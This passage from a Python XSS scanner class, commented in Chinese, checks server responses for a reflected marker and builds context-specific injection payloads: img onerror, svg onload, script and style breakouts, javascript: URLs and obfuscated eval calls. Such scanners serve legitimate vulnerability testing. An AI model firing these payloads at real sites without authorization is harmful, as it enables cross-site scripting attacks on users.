                            }}
                            
                            // 检查Angular应用
                            if (window.ng || document.querySelector('[ng-app]') || 
                                document.querySelector('[data-ng-app]') ||
                                document.querySelector('[ng-controller]')) {{
                                try {{
                                    var ngElements = document.querySelectorAll('*[ng-bind], *[data-ng-bind], *[ng-model], *[data-ng-model]');
                                    for (var i = 0; i < ngElements.length; i++) {{
                                        if (ngElements[i].textContent && 
                                            ngElements[i].textContent.includes('{self.xss_mark}')) {{
                                            hasXSS = true;
                                            break;
                                        }}
                                    }}
                                }} catch (e) {{}}
                            }}
                            
                            return hasXSS;
                        }})();
                    """)
                    
                    if has_xss:
                        return True
                except Exception as e:
                    logger.debug(f"DOM检查失败: {str(e)}")
            
            # 检查特定标签
            for tag_name in ['script', 'img', 'svg', 'iframe', 'body', 'input', 'textarea', 'video', 'audio', 
                           'a', 'div', 'button', 'form', 'object', 'embed', 'style', 'link', 'meta', 'noscript']:
                tags = soup.find_all(tag_name)
                for tag in tags:
                    tag_str = str(tag)
                    if self.xss_mark in tag_str:
                        return True
                        
            # 检查特定属性
            dangerous_attrs = [
                'src', 'href', 'action', 'data', 'formaction', 'content', 'poster', 'background',
                'onerror', 'onload', 'onfocus', 'onblur', 'onclick', 'onmouseover', 'onmouseout',
                'onkeyup', 'onkeydown', 'onchange', 'onsubmit', 'onreset', 'onselect', 'onabort',
                'ondblclick', 'onkeypress', 'onmousedown', 'onmouseup', 'onmousemove', 'onunload',
                'onbeforeunload', 'onhashchange', 'onpageshow', 'onpagehide', 'onplay', 'onpause',
                'ontoggle', 'onanimationstart', 'onanimationend', 'onanimationiteration', 'ontransitionend',
                'oncopy', 'oncut', 'onpaste', 'onwheel', 'onmessage', 'onstorage'
            ]
            
            for tag in soup.find_all():
                for attr in dangerous_attrs:
                    if tag.has_attr(attr) and self.xss_mark in tag[attr]:
                        return True
            
            # 检查内联样式表
            for style_tag in soup.find_all('style'):
                if self.xss_mark in style_tag.string:
                    return True
                    
            # 检查JSON数据
            script_tags = soup.find_all('script')
            for script in script_tags:
                if script.string and ('{' in script.string or '[' in script.string):
                    if self.xss_mark in script.string:
                        return True
                        
            # 检查URL中的javascript:协议
            for tag in soup.find_all(href=True):
                href = tag['href']
                if href.startswith('javascript:') and self.xss_mark in href:
                    return True
                    
            # 检查HTML注释
            comments = soup.find_all(string=lambda text: isinstance(text, str) and text.strip().startswith('<!--'))
            for comment in comments:
                if self.xss_mark in comment:
                    return True
                    
            # 检查隐藏的DOM元素
            for tag in soup.find_all(style=True):
                style = tag['style']
                if (('display:none' in style or 'visibility:hidden' in style) and 
                    self.xss_mark in str(tag)):
                    return True
                    
            # 检查编码内容(base64等)
            encoded_patterns = [
                r'base64,[a-zA-Z0-9+/=]+', 
                r'data:[^,]+,[a-zA-Z0-9+/=]+'
            ]
            
            for pattern in encoded_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    try:
                        decoded = base64.b64decode(match.split(',')[1]).decode('utf-8')
                        if self.xss_mark in decoded:
                            return True
                    except:
                        pass
                        
        except Exception as e:
            logger.error(f"检查XSS时发生错误: {str(e)}")
            
        return False
    
    def _detect_context(self, response, injection_point):
        """
        检测XSS注入点的上下文
        
        Args:
            response: 响应对象
            injection_point: 注入点标记
            
        Returns:
            str: 上下文类型 (html, attribute, js, css, url, json)
        """
        if not response or not response.text or injection_point not in response.text:
            return "unknown"
            
        try:
            html_content = response.text
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # 查找注入点在哪个地方
            for tag in soup.find_all():
                # 检查是否在标签内文本中
                if tag.string and injection_point in tag.string:
                    if tag.name == 'script':
                        return "js"
                    elif tag.name == 'style':
                        return "css"
                    else:
                        return "html"
                
                # 检查是否在属性中
                for attr, value in tag.attrs.items():
                    if isinstance(value, str) and injection_point in value:
                        if attr in ['src', 'href', 'action', 'formaction']:
                            return "url"
                        elif attr.startswith('on'):
                            return "js_event"
                        else:
                            return "attribute"
            
            # 检查是否在script的JSON数据中
            script_tags = soup.find_all('script')
            for script in script_tags:
                if script.string and injection_point in script.string:
                    if '{' in script.string or '[' in script.string:
                        try:
                            # 尝试解析成JSON
                            text = script.string
                            json_start = text.find('{')
                            json_end = text.rfind('}') + 1
                            if json_start >= 0 and json_end > json_start:
                                json_text = text[json_start:json_end]
                                if injection_point in json_text:
                                    return "json"
                        except:
                            pass
                    return "js"
            
            # 如果没有找到，可能是在HTML注释或其他地方
            if f"<!--{injection_point}-->" in html_content or f"<!--{injection_point}" in html_content or f"{injection_point}-->" in html_content:
                return "comment"
                
            # 检查内联样式
            for style_tag in soup.find_all('style'):
                if style_tag.string and injection_point in style_tag.string:
                    return "css"
                    
        except Exception as e:
            logger.error(f"检测上下文时出错: {str(e)}")
            
        return "unknown"
        
    def _get_context_specific_payloads(self, context):
        """
        获取特定上下文的XSS有效载荷
        
        Args:
            context: 上下文类型
            
        Returns:
            list: 适合该上下文的XSS有效载荷列表
        """
        # 基本的XSS标记
        xss_mark = self.xss_mark
        
        html_payloads = [
            f"<img src=x onerror=alert('{xss_mark}')>",
            f"<svg onload=alert('{xss_mark}')>",
            f"<iframe onload=alert('{xss_mark}')></iframe>"
        ]
        
        js_payloads = [
            f"alert('{xss_mark}')",
            f"(function(){{alert('{xss_mark}')}})();",
            f"';alert('{xss_mark}');//",
            f"\";alert('{xss_mark}');//",
            f"\\';alert('{xss_mark}');//",
            f"</script><img src=x onerror=alert('{xss_mark}')>"
        ]
        
        attribute_payloads = [
            f"\" onmouseover=\"alert('{xss_mark}')\" \"",
            f"' onmouseover='alert(\"{xss_mark}\")' '",
            f"onload=alert('{xss_mark}')",
            f"\" onerror=\"alert('{xss_mark}')\" \"",
            f"' onerror='alert(\"{xss_mark}\")' '"
        ]
        
        url_payloads = [
            f"javascript:alert('{xss_mark}')",
            f"data:text/html,<img src=x onerror=alert('{xss_mark}')>",
            f"data:text/html;base64,{base64.b64encode(f'<img src=x onerror=alert(\'{xss_mark}\')>'.encode()).decode()}"
        ]
        
        css_payloads = [
            f"</style><img src=x onerror=alert('{xss_mark}')>",
            f"</style><script>alert('{xss_mark}')</script>",
            f"<style>@import url(\"data:,*%7bx:expression(alert('{xss_mark}'))%7d\");</style>"
        ]
        
        json_payloads = [
            f"\",\"x\":\"<img src=x onerror=alert('{xss_mark}')>\",\"",
            f"\"-alert('{xss_mark}')-\"",
            f"\\u003cimg src=x onerror=alert('{xss_mark}')\\u003e"
        ]
        
        js_event_payloads = [
            f"alert('{xss_mark}')",
            f"a=alert;a('{xss_mark}')",
            f"[].map(alert)[0]('{xss_mark}')",
            f"eval('ale'+'rt')(`{xss_mark}`)"
        ]
        
        comment_payloads = [
            f"--><img src=x onerror=alert('{xss_mark}')><!--",
            f"--><script>alert('{xss_mark}')</script><!--"
        ]
        
        # 根据上下文返回对应的有效载荷
        context_payloads = {
            "html": html_payloads,
            "js": js_payloads,
            "attribute": attribute_payloads,
            "url": url_payloads,
            "css": css_payloads,
            "json": json_payloads,
            "js_event": js_event_payloads,
            "comment": comment_payloads,
            "unknown": html_payloads + js_payloads + attribute_payloads
        }
        
        return context_payloads.get(context, html_payloads)
    
    def _generate_random_string(self, length=8):
        """
        生成随机字符串
        
        Args:
            length: 字符串长度
            
        Returns:
            str: 随机字符串
        """
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _to_js_string(self, s):
        """
        将字符串转换为JavaScript字符串
        
        Args:
            s: 字符串
            
        Returns:
            str: JavaScript字符串
        """
        js_escape_table = {
            '\\': '\\\\',
            '\r': '\\r',
            '\n': '\\n',
            '"': '\\"',
            "'": "\\'"
        }
        
        result = ''
        for c in s:
            if c in js_escape_table:
                result += js_escape_table[c]
            else:
                result += c
                
        return f"'{result}'"
    
    def close(self):
        """关闭资源"""
        if self.use_browser and self.driver:
            try:
                self.driver.quit()
            except:
                pass
            
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True
        
    def get_tech_info(self):
        """获取技术检测信息"""
        return self.tech_info 